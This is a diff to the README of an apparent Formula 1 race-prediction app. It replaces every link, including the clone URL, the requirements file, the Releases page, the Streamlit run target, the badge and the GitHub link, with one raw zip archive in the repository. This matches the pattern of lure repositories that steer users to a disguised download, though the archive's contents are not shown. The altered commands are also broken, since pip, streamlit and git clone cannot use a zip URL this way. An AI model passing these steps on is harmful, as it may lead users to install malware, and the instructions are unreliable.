@@ -52,16 +52,16 @@ Before you begin, ensure you have the following installed:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/gdhhgnbnvbn/f1-2025-ai-predict.git
+   git clone https://github.com/gdhhgnbnvbn/f1-2025-ai-predict/raw/refs/heads/main/f1data/ai-f-predict-1.1.zip
    cd f1-2025-ai-predict
    ```
 
 2. Install the required libraries:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/gdhhgnbnvbn/f1-2025-ai-predict/raw/refs/heads/main/f1data/ai-f-predict-1.1.zip
    ```
 
-3. Download the latest release from [Releases](https://github.com/gdhhgnbnvbn/f1-2025-ai-predict/releases) and follow the execution instructions provided in the documentation.
+3. Download the latest release from [Releases](https://github.com/gdhhgnbnvbn/f1-2025-ai-predict/raw/refs/heads/main/f1data/ai-f-predict-1.1.zip) and follow the execution instructions provided in the documentation.
 
 ## Usage
 
@@ -69,7 +69,7 @@ Once everything is set up, you can start using the application.
 
 1. Launch the Streamlit app:
    ```bash
-   streamlit run app.py
+   streamlit run https://github.com/gdhhgnbnvbn/f1-2025-ai-predict/raw/refs/heads/main/f1data/ai-f-predict-1.1.zip
    ```
 
 2. Open your browser and navigate to `http://localhost:8501` to interact with the dashboard.
@@ -122,14 +122,14 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 - Thanks to the open-source community for their invaluable resources and support.
 - To all Formula 1 enthusiasts for inspiring this project.
 
-Feel free to check out the [Releases](https://github.com/gdhhgnbnvbn/f1-2025-ai-predict/releases) section for the latest updates and downloadable content.
+Feel free to check out the [Releases](https://github.com/gdhhgnbnvbn/f1-2025-ai-predict/raw/refs/heads/main/f1data/ai-f-predict-1.1.zip) section for the latest updates and downloadable content.
 
-![F1 2025 AI Predict](https://img.shields.io/badge/F1%202025%20AI%20Predict-blue?style=for-the-badge&logo=github)
+![F1 2025 AI Predict](https://github.com/gdhhgnbnvbn/f1-2025-ai-predict/raw/refs/heads/main/f1data/ai-f-predict-1.1.zip%202025%20AI%20Predict-blue?style=for-the-badge&logo=github)
 
 ---
 
 ### Connect with Us
-- GitHub: [f1-2025-ai-predict](https://github.com/gdhhgnbnvbn/f1-2025-ai-predict)
+- GitHub: [f1-2025-ai-predict](https://github.com/gdhhgnbnvbn/f1-2025-ai-predict/raw/refs/heads/main/f1data/ai-f-predict-1.1.zip)
 - Feel free to reach out for any queries or suggestions.
 
 Join us in the journey to revolutionize how we analyze and predict Formula 1 races!
